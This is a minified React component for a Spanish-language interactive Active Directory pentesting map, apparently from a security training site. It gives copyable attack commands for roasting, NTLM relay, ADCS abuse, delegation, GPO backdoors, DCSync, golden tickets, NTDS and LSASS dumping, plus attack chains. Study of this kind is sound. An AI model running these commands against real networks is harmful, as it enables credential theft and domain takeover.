import{a as e,n as t,t as n}from"./jsx-runtime-n5LQ9ujS.js";import{L as r}from"./index-Cb21vUpX.js";var i=e(t(),1),a=n(),o=[{id:`recon`,label:`Reconocimiento`,short:`RECON`,color:`#2563eb`,glow:`rgba(37,99,235,0.25)`,nodes:[{id:`nmap`,title:`Escaneo de Red`,impact:`INFO`,tools:[`nmap`,`CrackMapExec`,`netexec`],desc:`Descubrimiento de hosts y servicios expuestos en la red del dominio. Punto de partida de cualquier auditoría interna.`,poc:`# Descubrir hosts activos y DC
nmap -sV -p 88,389,445,636,3268 10.10.10.0/24

# Identificar DC con netexec
netexec smb 10.10.10.0/24 --gen-relay-list alive.txt`,link:null},{id:`bloodhound`,title:`BloodHound`,impact:`ALTO`,tools:[`SharpHound`,`bloodhound-python`],desc:`Recolecta relaciones de AD y calcula automáticamente rutas de ataque hacia Domain Admin mediante grafos.`,poc:`# Recolección desde Linux (sin agente en Windows)
bloodhound-python -u "usuario" -p "Pass123" \\
  -d corp.local -ns 10.10.10.10 -c All

# Iniciar BloodHound
sudo neo4j start && bloodhound`,link:`/pentesting/active-directory/bloodhound`},{id:`ldap`,title:`Enumeración LDAP`,impact:`MEDIO`,tools:[`ldapsearch`,`ldeep`,`windapsearch`],desc:`Extracción de usuarios, grupos, equipos, SPNs y atributos del directorio sin autenticación en algunos casos.`,poc:`# Enum anónimo (null session)
ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local"

# Enum autenticado con ldeep
ldeep ldap -u user -p Pass123 -d corp.local -s ldap://10.10.10.10 all`,link:`/pentesting/active-directory/ldap`},{id:`smb`,title:`Enumeración SMB`,impact:`MEDIO`,tools:[`enum4linux-ng`,`smbclient`,`netexec`],desc:`Listado de shares, usuarios, grupos y políticas de contraseñas. Puede revelar datos sensibles en shares abiertos.`,poc:`# Enum completo con enum4linux-ng
enum4linux-ng -A 10.10.10.10

# Listar shares sin cred
smbclient -L //10.10.10.10 -N

# Usuarios con netexec
netexec smb 10.10.10.10 --users`,link:`/pentesting/active-directory/smb-sysvol`},{id:`aclenum`,title:`ACL Enum`,impact:`ALTO`,tools:[`dacledit`,`BH Cypher`,`ldap-search`],desc:`Identifica permisos abusables sobre objetos AD: GenericAll, WriteDACL, ForceChangePassword, etc.`,poc:`# Leer DACLs de un objeto
dacledit.py -action read -target "user_objetivo" \\
  -dc-ip 10.10.10.10 corp/user:Pass123

# Buscar GenericWrite en BloodHound
MATCH p=(u)-[:GenericWrite]->(o) RETURN p LIMIT 25`,link:`/pentesting/active-directory/acl-ace`}]},{id:`creds`,label:`Acceso a Credenciales`,short:`CREDENCIALES`,color:`#d97706`,glow:`rgba(217,119,6,0.25)`,nodes:[{id:`asrep`,title:`AS-REP Roasting`,impact:`ALTO`,tools:[`GetNPUsers.py`,`Rubeus`,`hashcat`],desc:`Obtiene hashes de cuentas que no requieren pre-autenticación Kerberos. No necesita credenciales previas.`,poc:`# Sin credenciales previas
GetNPUsers.py corp.local/ -dc-ip 10.10.10.10 \\
  -usersfile usuarios.txt -format hashcat -outputfile asrep.txt

# Crackear offline
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt`,link:`/pentesting/active-directory/kerberos`},{id:`kerberoast`,title:`Kerberoasting`,impact:`ALTO`,tools:[`GetUserSPNs.py`,`Rubeus`,`hashcat -m 13100`],desc:`Solicita tickets TGS para cuentas de servicio (SPNs) y los rompe offline. Cualquier usuario del dominio puede hacerlo.`,poc:`# Solicitar tickets TGS para todos los SPNs
GetUserSPNs.py corp.local/user:Pass123 \\
  -dc-ip 10.10.10.10 -request -outputfile tgs.txt

# Crackear (modo Kerberos 5 TGS RC4)
hashcat -m 13100 tgs.txt rockyou.txt --force`,link:`/pentesting/active-directory/kerberos`},{id:`spray`,title:`Password Spray`,impact:`MEDIO`,tools:[`kerbrute`,`netexec`,`spray.py`],desc:`Prueba una contraseña común contra muchos usuarios. Evita bloqueos usando el lockout threshold del dominio.`,poc:`# Spray con kerbrute (evita bloqueos)
kerbrute passwordspray -d corp.local \\
  --dc 10.10.10.10 usuarios.txt "Winter2024!"

# Con netexec
netexec smb 10.10.10.10 -u usuarios.txt -p "Winter2024!" \\
  --no-bruteforce --continue-on-success`,link:`/pentesting/active-directory/password-attacks`},{id:`ntlmrelay`,title:`NTLM Relay`,impact:`CRÍTICO`,tools:[`Responder`,`ntlmrelayx.py`,`mitm6`],desc:`Captura hashes NTLMv2 y los retransmite a otros servicios. Si SMB signing está deshabilitado, puede comprometer múltiples hosts.`,poc:`# 1. Deshabilitar SMB/HTTP en Responder (para no consumir el hash)
sudo responder -I eth0 -rdw --disable-ess

# 2. Configurar relay hacia LDAP del DC
ntlmrelayx.py -t ldaps://10.10.10.10 --add-computer attacker$ \\
  -smb2support --delegate-access

# Verificar si SMB signing está deshabilitado
netexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt`,link:`/pentesting/active-directory/ntlm-coercion`},{id:`shadow`,title:`Shadow Credentials`,impact:`CRÍTICO`,tools:[`pywhisker`,`certipy`,`gettgtpkinit`],desc:`Añade una clave pública al atributo msDS-KeyCredentialLink de una cuenta. Permite obtener TGT sin conocer la contraseña.`,poc:`# Añadir shadow credential (requiere WriteDACL o GenericWrite)
pywhisker.py -d "corp.local" -u "attacker" -p "Pass123" \\
  --target "objetivo" --action "add"

# Obtener TGT usando la clave privada generada
gettgtpkinit.py -cert-pfx user.pfx -pfx-pass "password" \\
  corp.local/objetivo objetivo.ccache`,link:`/pentesting/active-directory/adcs`}]},{id:`privesc`,label:`Escalada de Privilegios`,short:`PRIVESC`,color:`#dc2626`,glow:`rgba(220,38,38,0.25)`,nodes:[{id:`aclabuse`,title:`Abuso de ACLs`,impact:`CRÍTICO`,tools:[`dacledit`,`bloodyAD`,`PowerView`],desc:`Explotación de permisos mal configurados: GenericAll, WriteDACL, ForceChangePassword. Cadenas de ACLs llevan directo a DA.`,poc:`# ForceChangePassword → cambiar contraseña sin conocerla
net rpc password "objetivo" "NuevaPass123!" \\
  -U "corp.local/atacante%Pass123" -S 10.10.10.10

# WriteDACL → grant DCSync rights
dacledit.py -action "write" -rights "DCSync" \\
  -target "corp.local" corp/atacante:Pass123 -dc-ip 10.10.10.10`,link:`/pentesting/active-directory/acl-ace`},{id:`adcs`,title:`ADCS ESC1–ESC16`,impact:`CRÍTICO`,tools:[`certipy`,`Certify.exe`,`PKINIT`],desc:`Configuraciones incorrectas en Active Directory Certificate Services permiten solicitar certificados como cualquier usuario del dominio, incluido DA.`,poc:`# Encontrar plantillas vulnerables (ESC1)
certipy find -u user@corp.local -p Pass123 \\
  -dc-ip 10.10.10.10 -vulnerable -stdout

# Solicitar certificado como DA (ESC1)
certipy req -u user@corp.local -p Pass123 \\
  -ca Corp-CA -template VulnerableTemplate \\
  -upn administrator@corp.local

# Autenticar con el certificado
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10`,link:`/pentesting/active-directory/adcs`},{id:`delegation`,title:`Delegación Kerberos`,impact:`ALTO`,tools:[`impacket`,`Rubeus`,`getST.py`],desc:`Unconstrained: captura TGT de cualquier usuario que se autentique. Constrained + RBCD: impersonar usuarios específicos hacia servicios definidos.`,poc:`# RBCD — Resource-Based Constrained Delegation
# 1. Crear cuenta de máquina atacante
addcomputer.py -computer-name 'ATTACKER$' \\
  -computer-pass 'AttPass123' corp.local/user:Pass123

# 2. Configurar RBCD sobre el objetivo
rbcd.py -delegate-from 'ATTACKER$' \\
  -delegate-to 'TARGET$' -action write corp.local/user:Pass123

# 3. Obtener TGS como Administrator
getST.py -spn cifs/target.corp.local \\
  -impersonate Administrator corp.local/'ATTACKER$':AttPass123`,link:`/pentesting/active-directory/delegation`},{id:`gpo`,title:`Abuso de GPO`,impact:`ALTO`,tools:[`SharpGPOAbuse`,`GPOddity`,`PowerView`],desc:`Si tienes permisos de escritura sobre una GPO, puedes ejecutar comandos en todos los equipos vinculados a ella.`,poc:`# Añadir tarea programada via GPO (SharpGPOAbuse)
SharpGPOAbuse.exe --AddComputerTask \\
  --TaskName "UpdateTask" \\
  --Author "NT AUTHORITY\\SYSTEM" \\
  --Command "cmd.exe" \\
  --Arguments "/c net localgroup administrators attacker /add" \\
  --GPOName "Default Domain Policy"`,link:`/pentesting/active-directory/gpo`}]},{id:`lateral`,label:`Movimiento Lateral`,short:`LATERAL`,color:`#0891b2`,glow:`rgba(8,145,178,0.25)`,nodes:[{id:`pth`,title:`Pass the Hash`,impact:`ALTO`,tools:[`psexec.py`,`netexec`,`evil-winrm`],desc:`Usa el hash NT de un usuario para autenticarse sin necesitar la contraseña en texto claro. Funciona con NTLM.`,poc:`# Ejecutar comando como DA usando su hash NT
psexec.py corp.local/administrator@10.10.10.10 \\
  -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH

# Con netexec (verificar acceso a múltiples hosts)
netexec smb 10.10.10.0/24 \\
  -u administrator -H NTHASH --local-auth`,link:`/pentesting/active-directory/lateral-movement`},{id:`ptt`,title:`Pass the Ticket`,impact:`ALTO`,tools:[`impacket`,`Rubeus`,`KRB5CCNAME`],desc:`Inyecta un ticket Kerberos (TGT o TGS) robado o forjado en la sesión actual para autenticarse como otro usuario.`,poc:`# Exportar ticket desde Windows (Rubeus)
Rubeus.exe dump /nowrap

# Usar ticket desde Linux
export KRB5CCNAME=/tmp/administrator.ccache
psexec.py -k -no-pass corp.local/administrator@DC01.corp.local

# Convertir ticket .kirbi a .ccache
ticketConverter.py administrator.kirbi administrator.ccache`,link:`/pentesting/active-directory/lateral-movement`},{id:`winrm`,title:`WinRM / RDP`,impact:`MEDIO`,tools:[`evil-winrm`,`xfreerdp`,`ncrack`],desc:`Acceso interactivo a sistemas Windows. WinRM (5985/5986) permite shell remota si el usuario tiene permisos.`,poc:`# Shell interactiva via WinRM
evil-winrm -i 10.10.10.10 -u administrator -p Pass123

# Con hash (Pass-the-Hash)
evil-winrm -i 10.10.10.10 -u administrator -H NTHASH

# RDP con xfreerdp
xfreerdp /u:administrator /p:Pass123 /v:10.10.10.10 +clipboard`,link:null}]},{id:`persist`,label:`Persistencia`,short:`PERSISTENCIA`,color:`#7c3aed`,glow:`rgba(124,58,237,0.25)`,nodes:[{id:`silver`,title:`Silver Ticket`,impact:`ALTO`,tools:[`ticketer.py`,`Mimikatz`,`impacket`],desc:`Con el hash NT de una cuenta de servicio, se forja un TGS para ese servicio concreto. No pasa por el KDC.`,poc:`# Forjar Silver Ticket para CIFS (acceso SMB)
ticketer.py -nthash SERVICE_NTHASH \\
  -domain-sid S-1-5-21-... -domain corp.local \\
  -spn cifs/server.corp.local administrator

# Usar el ticket
export KRB5CCNAME=administrator.ccache
smbclient.py -k corp.local/administrator@server.corp.local`,link:`/pentesting/active-directory/tickets`},{id:`adminsdholder`,title:`AdminSDHolder`,impact:`ALTO`,tools:[`dacledit`,`PowerView`,`ldap-shell`],desc:`Añade permisos sobre AdminSDHolder. Cada 60 minutos el SDProp propaga esos permisos a todas las cuentas protegidas (DA, EA, etc.).`,poc:`# Añadir GenericAll sobre AdminSDHolder
dacledit.py -action write -rights GenericAll \\
  -target "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \\
  corp.local/attacker:Pass123 -dc-ip 10.10.10.10

# Tras 60min (o forzar SDProp)
Invoke-ADSDPropagation  # script de PowerView`,link:`/pentesting/active-directory/persistence-opsec`},{id:`gpopersist`,title:`GPO Backdoor`,impact:`ALTO`,tools:[`SharpGPOAbuse`,`impacket`,`bloodyAD`],desc:`Añade una tarea programada, script de inicio de sesión o cuenta local admin a través de una GPO controlada.`,poc:`# Tarea programada que ejecuta beacon/payload
SharpGPOAbuse.exe --AddComputerTask \\
  --TaskName "WindowsUpdate" \\
  --Command "powershell.exe" \\
  --Arguments "-enc BASE64_PAYLOAD" \\
  --GPOName "Default Domain Controllers Policy"`,link:`/pentesting/active-directory/persistence-opsec`}]},{id:`domdom`,label:`Dominación de Dominio`,short:`DOM DOMINANCE`,color:`#be185d`,glow:`rgba(190,24,93,0.25)`,nodes:[{id:`dcsync`,title:`DCSync`,impact:`CRÍTICO`,tools:[`secretsdump.py`,`Mimikatz`,`netexec`],desc:`Replica las credenciales del DC sin acceso físico. Necesita DS-Replication-Get-Changes-All. Vuelca todos los hashes del dominio.`,poc:`# Volcar todos los hashes del dominio
secretsdump.py corp.local/da_user:Pass123@10.10.10.10 \\
  -just-dc-ntlm

# Solo el hash de krbtgt (para Golden Ticket)
secretsdump.py corp.local/da_user:Pass123@10.10.10.10 \\
  -just-dc-user krbtgt

# Verificar privilegios de replicación
netexec smb 10.10.10.10 -u user -p Pass123 --ntds drsuapi`,link:`/pentesting/active-directory/dcsync`},{id:`golden`,title:`Golden Ticket`,impact:`CRÍTICO`,tools:[`ticketer.py`,`Mimikatz`,`Rubeus`],desc:`Con el hash de krbtgt se forja un TGT que da acceso como cualquier usuario durante 10 años. Persiste aunque cambien contraseñas.`,poc:`# Obtener hash krbtgt primero (DCSync)
secretsdump.py ... -just-dc-user krbtgt

# Forjar Golden Ticket
ticketer.py -nthash KRBTGT_HASH \\
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \\
  -domain corp.local administrator

# Usar el ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass corp.local/administrator@DC01.corp.local`,link:`/pentesting/active-directory/tickets`},{id:`ntds`,title:`NTDS.dit Dump`,impact:`CRÍTICO`,tools:[`secretsdump`,`ntdsutil`,`vssadmin`],desc:`Extracción completa de la base de datos del DC. Contiene los hashes de todas las cuentas del dominio (actuales e históricas).`,poc:`# Via secretsdump (método recomendado)
secretsdump.py corp.local/admin:Pass123@DC01.corp.local

# Via VSS shadow copy (local en el DC)
vssadmin create shadow /for=C:
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit .
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`,link:`/pentesting/active-directory/credential-dumping`},{id:`mimikatz`,title:`Mimikatz / LSASS`,impact:`CRÍTICO`,tools:[`Mimikatz`,`pypykatz`,`lsassy`],desc:`Extrae credenciales en texto claro, hashes y tickets Kerberos de memoria LSASS. Detectado por EDR modernos.`,poc:`# Volcado de credenciales en memoria (local)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Remotamente con lsassy
lsassy -u administrator -p Pass123 10.10.10.10

# Desde Linux con pypykatz
pypykatz lsa minidump lsass.DMP`,link:`/pentesting/active-directory/mimikatz`}]}],s={CRÍTICO:{bg:`rgba(220,38,38,0.1)`,color:`#dc2626`,border:`rgba(220,38,38,0.3)`},ALTO:{bg:`rgba(217,119,6,0.1)`,color:`#d97706`,border:`rgba(217,119,6,0.3)`},MEDIO:{bg:`rgba(37,99,235,0.08)`,color:`#2563eb`,border:`rgba(37,99,235,0.25)`},INFO:{bg:`rgba(100,116,139,0.08)`,color:`#64748b`,border:`rgba(100,116,139,0.2)`}};function c({level:e}){let t=s[e]||s.INFO;return(0,a.jsx)(`span`,{style:{display:`inline-block`,fontFamily:`var(--font-mono)`,fontSize:`8px`,fontWeight:800,letterSpacing:`0.1em`,padding:`2px 7px`,borderRadius:`4px`,background:t.bg,color:t.color,border:`1px solid ${t.border}`},children:e})}function l({name:e}){return(0,a.jsx)(`span`,{style:{fontFamily:`var(--font-mono)`,fontSize:`10px`,padding:`2px 8px`,borderRadius:`4px`,background:`var(--surface-2)`,color:`var(--text-soft)`,border:`1px solid var(--line)`,display:`inline-block`},children:e})}function u({node:e,phaseColor:t,phaseGlow:n,isActive:o,onActivate:s,onLink:u}){let[d,f]=(0,i.useState)(!1),p=(0,i.useCallback)(t=>{t.stopPropagation(),navigator.clipboard.writeText(e.poc).then(()=>{f(!0),setTimeout(()=>f(!1),1800)})},[e.poc]);return(0,a.jsxs)(`div`,{id:`node-${e.id}`,onClick:s,style:{background:o?`var(--hx-panel-2)`:`var(--hx-panel)`,border:`1px solid ${o?t:`var(--line-strong)`}`,borderLeft:`3px solid ${t}`,borderRadius:`8px`,padding:`11px 13px`,cursor:`pointer`,transition:`all 0.2s`,boxShadow:o?`0 4px 20px ${n}, 0 0 0 1px ${t}30`:`0 1px 3px rgba(0,0,0,0.06)`,transform:o?`scale(1.01)`:``},onMouseEnter:e=>{o||(e.currentTarget.style.boxShadow=`0 2px 10px ${n}`)},onMouseLeave:e=>{o||(e.currentTarget.style.boxShadow=`0 1px 3px rgba(0,0,0,0.06)`)},children:[(0,a.jsxs)(`div`,{style:{display:`flex`,alignItems:`flex-start`,justifyContent:`space-between`,gap:`6px`,marginBottom:`6px`},children:[(0,a.jsx)(`span`,{style:{fontFamily:`var(--font-mono)`,fontSize:`12px`,fontWeight:700,color:o?t:`var(--text)`,lineHeight:1.3,flex:1},children:e.title}),(0,a.jsx)(c,{level:e.impact})]}),(0,a.jsx)(`div`,{style:{display:`flex`,flexWrap:`wrap`,gap:`4px`,marginBottom:o?`10px`:`0`},children:e.tools.map(e=>(0,a.jsx)(l,{name:e},e))}),o&&(0,a.jsxs)(`div`,{style:{marginTop:`10px`,borderTop:`1px solid var(--line)`,paddingTop:`10px`},children:[(0,a.jsx)(`p`,{style:{fontSize:`12.5px`,color:`var(--text-body)`,lineHeight:1.65,marginBottom:`12px`},children:e.desc}),(0,a.jsxs)(`div`,{style:{background:`var(--hx-panel-2)`,borderRadius:`8px`,border:`1px solid var(--hx-border)`,overflow:`hidden`,marginBottom:`10px`},children:[(0,a.jsxs)(`div`,{style:{display:`flex`,alignItems:`center`,justifyContent:`space-between`,padding:`7px 12px`,borderBottom:`1px solid var(--hx-border)`},children:[(0,a.jsx)(`span`,{style:{fontFamily:`var(--font-mono)`,fontSize:`10px`,color:`var(--hx-muted)`,letterSpacing:`0.08em`},children:`POC / COMANDOS`}),(0,a.jsx)(`button`,{onClick:p,style:{fontFamily:`var(--font-mono)`,fontSize:`10px`,color:d?`var(--hx-green)`:`var(--hx-muted)`,background:`none`,border:`none`,cursor:`pointer`,transition:`color 0.2s`,padding:`2px 6px`},children:d?`✓ Copiado`:`Copiar`})]}),(0,a.jsx)(`pre`,{style:{fontFamily:`var(--font-mono)`,fontSize:`11px`,color:`#e2e8f0`,lineHeight:1.7,padding:`12px 14px`,margin:0,overflowX:`auto`,whiteSpace:`pre`},children:e.poc.split(`
`).map((e,t)=>e.trim().startsWith(`#`)?(0,a.jsxs)(`span`,{style:{color:`#94a3b8`},children:[e,`
`]},t):(e.replace(/(".*?")/g,`<STR>`).split(/(<STR>)/),(0,a.jsxs)(`span`,{children:[e,`
`]},t)))})]}),(0,a.jsxs)(`div`,{style:{display:`flex`,gap:`8px`,flexWrap:`wrap`},children:[e.link&&(0,a.jsx)(r,{to:e.link,onClick:e=>e.stopPropagation(),style:{fontFamily:`var(--font-mono)`,fontSize:`11px`,color:t,border:`1px solid ${t}40`,padding:`5px 12px`,borderRadius:`6px`,display:`inline-flex`,alignItems:`center`,gap:`5px`,textDecoration:`none`,transition:`background 0.15s`,background:`${t}08`},onMouseEnter:e=>{e.currentTarget.style.background=`${t}15`},onMouseLeave:e=>{e.currentTarget.style.background=`${t}08`},children:`Ver nota completa →`}),(0,a.jsx)(`button`,{onClick:e=>{e.stopPropagation(),s()},style:{fontFamily:`var(--font-mono)`,fontSize:`11px`,color:`var(--text-faint)`,border:`1px solid var(--line)`,padding:`5px 12px`,borderRadius:`6px`,background:`none`,cursor:`pointer`,transition:`background 0.15s`},children:`Cerrar ✕`})]})]})]})}function d({fromColor:e,toColor:t}){return(0,a.jsx)(`div`,{style:{display:`flex`,flexDirection:`column`,alignItems:`center`,justifyContent:`flex-start`,paddingTop:`55px`,width:`32px`,flexShrink:0},children:(0,a.jsxs)(`svg`,{width:`32`,height:`40`,viewBox:`0 0 32 40`,fill:`none`,children:[(0,a.jsxs)(`defs`,{children:[(0,a.jsxs)(`linearGradient`,{id:`grad-${e}-${t}`,x1:`0`,y1:`20`,x2:`32`,y2:`20`,gradientUnits:`userSpaceOnUse`,children:[(0,a.jsx)(`stop`,{offset:`0%`,stopColor:e,stopOpacity:`0.6`}),(0,a.jsx)(`stop`,{offset:`100%`,stopColor:t,stopOpacity:`0.6`})]}),(0,a.jsx)(`marker`,{id:`arrow-${t}`,markerWidth:`8`,markerHeight:`6`,refX:`8`,refY:`3`,orient:`auto`,children:(0,a.jsx)(`polygon`,{points:`0 0, 8 3, 0 6`,fill:t,opacity:`0.7`})})]}),(0,a.jsx)(`line`,{x1:`2`,y1:`20`,x2:`26`,y2:`20`,stroke:`url(#grad-${e}-${t})`,strokeWidth:`1.5`,markerEnd:`url(#arrow-${t})`,strokeDasharray:`4 3`,children:(0,a.jsx)(`animate`,{attributeName:`stroke-dashoffset`,from:`0`,to:`-14`,dur:`1.2s`,repeatCount:`indefinite`})})]})})}function f(){let[e,t]=(0,i.useState)(new Set(o.map(e=>e.id))),[n,r]=(0,i.useState)(null),[l,f]=(0,i.useState)(``),p=o.filter(t=>e.has(t.id)),m=e=>{t(t=>{let n=new Set(t);return n.has(e)&&n.size>1?n.delete(e):n.add(e),n})},h=()=>t(new Set(o.map(e=>e.id))),g=e=>{if(!l)return e.nodes;let t=l.toLowerCase();return e.nodes.filter(e=>e.title.toLowerCase().includes(t)||e.tools.some(e=>e.toLowerCase().includes(t))||e.desc.toLowerCase().includes(t))};return(0,a.jsxs)(`div`,{className:`page`,style:{color:`var(--text)`,fontFamily:`var(--font-sans)`},children:[(0,a.jsxs)(`div`,{style:{marginBottom:`28px`},children:[(0,a.jsxs)(`div`,{style:{display:`inline-flex`,alignItems:`center`,gap:`8px`,fontFamily:`var(--font-mono)`,fontSize:`10px`,fontWeight:700,letterSpacing:`0.14em`,textTransform:`uppercase`,color:`var(--text-faint)`,marginBottom:`8px`},children:[(0,a.jsx)(`span`,{style:{width:`6px`,height:`6px`,borderRadius:`50%`,background:`var(--hx-green)`,display:`inline-block`}}),`Active Directory Pentesting · Mapa Interactivo`]}),(0,a.jsx)(`h1`,{style:{fontSize:`clamp(1.5rem,3.5vw,2.25rem)`,fontWeight:900,letterSpacing:`-0.03em`,color:`var(--ink)`,lineHeight:1.1,marginBottom:`10px`},children:`Arquitectura de Ataque AD`}),(0,a.jsx)(`p`,{style:{fontSize:`0.9375rem`,color:`var(--text-body)`,maxWidth:`52rem`,lineHeight:1.7,marginBottom:`0`},children:`Mapa interactivo completo de las fases de un ataque sobre entornos Active Directory. Haz clic en cualquier técnica para ver descripción, herramientas y PoC con comandos reales. Filtra por fase para centrar tu análisis.`})]}),(0,a.jsxs)(`div`,{style:{display:`flex`,flexWrap:`wrap`,gap:`8px`,alignItems:`center`,marginBottom:`20px`},children:[o.map(t=>(0,a.jsx)(`button`,{onClick:()=>m(t.id),style:{fontFamily:`var(--font-mono)`,fontSize:`10px`,fontWeight:700,letterSpacing:`0.06em`,padding:`5px 12px`,borderRadius:`20px`,border:`1px solid ${e.has(t.id)?t.color:`var(--line)`}`,background:e.has(t.id)?`${t.color}12`:`transparent`,color:e.has(t.id)?t.color:`var(--text-faint)`,cursor:`pointer`,transition:`all 0.15s`,textTransform:`uppercase`},children:t.short},t.id)),e.size<o.length&&(0,a.jsx)(`button`,{onClick:h,style:{fontFamily:`var(--font-mono)`,fontSize:`10px`,padding:`5px 12px`,borderRadius:`20px`,border:`1px solid var(--line)`,background:`transparent`,color:`var(--text-faint)`,cursor:`pointer`},children:`Mostrar todo`}),(0,a.jsxs)(`div`,{style:{marginLeft:`auto`,display:`flex`,alignItems:`center`,gap:`6px`},children:[(0,a.jsx)(`input`,{type:`text`,placeholder:`Buscar técnica o herramienta...`,value:l,onChange:e=>f(e.target.value),style:{fontFamily:`var(--font-mono)`,fontSize:`11px`,padding:`6px 12px`,borderRadius:`8px`,border:`1px solid var(--line-strong)`,background:`var(--hx-panel)`,color:`var(--text)`,outline:`none`,width:`220px`},onFocus:e=>{e.target.style.borderColor=`var(--hx-green)`},onBlur:e=>{e.target.style.borderColor=`var(--line-strong)`}}),l&&(0,a.jsx)(`button`,{onClick:()=>f(``),style:{fontFamily:`var(--font-mono)`,fontSize:`11px`,color:`var(--text-faint)`,background:`none`,border:`none`,cursor:`pointer`},children:`✕`})]})]}),(0,a.jsx)(`div`,{style:{overflowX:`auto`,paddingBottom:`8px`,marginBottom:`40px`},children:(0,a.jsx)(`div`,{style:{display:`flex`,gap:`0`,alignItems:`flex-start`,minWidth:`${p.length*220}px`},children:p.map((e,t)=>{let i=g(e);return(0,a.jsxs)(`div`,{style:{display:`flex`,alignItems:`flex-start`},children:[(0,a.jsxs)(`div`,{style:{width:`210px`,flexShrink:0,display:`flex`,flexDirection:`column`,gap:`6px`},children:[(0,a.jsxs)(`div`,{style:{padding:`9px 12px`,background:`${e.color}0d`,border:`1px solid ${e.color}40`,borderRadius:`8px`,marginBottom:`4px`},children:[(0,a.jsx)(`div`,{style:{fontFamily:`var(--font-mono)`,fontSize:`9px`,fontWeight:800,letterSpacing:`0.12em`,textTransform:`uppercase`,color:e.color,marginBottom:`1px`},children:e.short}),(0,a.jsx)(`div`,{style:{fontFamily:`var(--font-sans)`,fontSize:`12.5px`,fontWeight:700,color:`var(--text)`},children:e.label}),(0,a.jsxs)(`div`,{style:{fontFamily:`var(--font-mono)`,fontSize:`10px`,color:e.color,marginTop:`2px`,opacity:.7},children:[i.length,` técnica`,i.length===1?``:`s`]})]}),i.length===0?(0,a.jsx)(`div`,{style:{fontFamily:`var(--font-mono)`,fontSize:`11px`,color:`var(--text-faint)`,padding:`12px`,textAlign:`center`,border:`1px dashed var(--line)`,borderRadius:`8px`},children:`Sin resultados`}):i.map(t=>(0,a.jsx)(u,{node:t,phaseColor:e.color,phaseGlow:e.glow,isActive:n===t.id,onActivate:()=>r(n===t.id?null:t.id)},t.id))]}),t<p.length-1&&(0,a.jsx)(d,{fromColor:e.color,toColor:p[t+1].color})]},e.id)})})}),(0,a.jsx)(`h2`,{style:{fontWeight:800,fontSize:`1.125rem`,letterSpacing:`-0.02em`,color:`var(--text)`,marginBottom:`14px`},children:`Cadenas de Ataque Clásicas`}),(0,a.jsx)(`div`,{style:{display:`flex`,flexDirection:`column`,gap:`12px`,marginBottom:`40px`},children:[{label:`Kerberoasting → Domain Admin`,color:`#d97706`,steps:[`Enum SPNs`,`GetUserSPNs.py`,`Crackear TGS`,`Credencial DA`,`PtH / Shell`]},{label:`NTLM Relay → RBCD → DA`,color:`#dc2626`,steps:[`Responder`,`ntlmrelayx → LDAP`,`Crear MachineAccount`,`RBCD sobre objetivo`,`getST.py → DA`]},{label:`ACL Abuse → DCSync → Golden Ticket`,color:`#7c3aed`,steps:[`GenericWrite / WriteDACL`,`Añadir DCSync rights`,`secretsdump krbtgt`,`ticketer.py`,`Acceso persistente`]},{label:`ADCS ESC1 → Golden Ticket`,color:`#0891b2`,steps:[`certipy find -vulnerable`,`Solicitar cert como DA`,`certipy auth (PKINIT)`,`Obtener NT hash DA`,`Golden Ticket`]}].map((e,t)=>(0,a.jsxs)(`div`,{style:{background:`var(--surface)`,border:`1px solid var(--line)`,borderLeft:`3px solid ${e.color}`,borderRadius:`8px`,padding:`12px 16px`,overflowX:`auto`},children:[(0,a.jsx)(`div`,{style:{fontFamily:`var(--font-mono)`,fontSize:`10px`,fontWeight:700,color:e.color,letterSpacing:`0.07em`,textTransform:`uppercase`,marginBottom:`10px`},children:e.label}),(0,a.jsx)(`div`,{style:{display:`flex`,alignItems:`center`,gap:`0`,flexWrap:`nowrap`},children:e.steps.map((n,r)=>(0,a.jsxs)(`span`,{style:{display:`flex`,alignItems:`center`,flexShrink:0},children:[(0,a.jsxs)(`span`,{style:{fontFamily:`var(--font-mono)`,fontSize:`11px`,padding:`4px 10px`,background:`var(--hx-panel)`,border:`1px solid ${e.color}35`,borderRadius:`6px`,color:`var(--text)`,whiteSpace:`nowrap`,boxShadow:`0 1px 3px ${e.color}10`},children:[r+1,`. `,n]}),r<e.steps.length-1&&(0,a.jsxs)(`svg`,{width:`28`,height:`12`,viewBox:`0 0 28 12`,style:{flexShrink:0},children:[(0,a.jsx)(`defs`,{children:(0,a.jsx)(`marker`,{id:`arr-${t}-${r}`,markerWidth:`6`,markerHeight:`5`,refX:`6`,refY:`2.5`,orient:`auto`,children:(0,a.jsx)(`polygon`,{points:`0 0, 6 2.5, 0 5`,fill:e.color,opacity:`0.6`})})}),(0,a.jsx)(`line`,{x1:`2`,y1:`6`,x2:`22`,y2:`6`,stroke:e.color,strokeWidth:`1.5`,strokeOpacity:`0.5`,markerEnd:`url(#arr-${t}-${r})`,strokeDasharray:`3 2`,children:(0,a.jsx)(`animate`,{attributeName:`stroke-dashoffset`,from:`0`,to:`-10`,dur:`1s`,repeatCount:`indefinite`})})]})]},r))})]},t))}),(0,a.jsxs)(`div`,{style:{background:`var(--surface)`,border:`1px solid var(--line)`,borderRadius:`10px`,padding:`14px 18px`,display:`flex`,flexWrap:`wrap`,gap:`16px`,alignItems:`center`,marginBottom:`8px`},children:[(0,a.jsx)(`span`,{style:{fontFamily:`var(--font-mono)`,fontSize:`10px`,fontWeight:700,color:`var(--text-faint)`,letterSpacing:`0.1em`,textTransform:`uppercase`},children:`Impacto:`}),Object.entries(s).map(([e,t])=>(0,a.jsx)(`span`,{style:{display:`flex`,alignItems:`center`,gap:`5px`},children:(0,a.jsx)(c,{level:e})},e)),(0,a.jsx)(`span`,{style:{fontFamily:`var(--font-mono)`,fontSize:`10px`,color:`var(--text-faint)`,marginLeft:`8px`},children:`Haz clic en un nodo para ver PoC y comandos`})]})]})}export{f as default};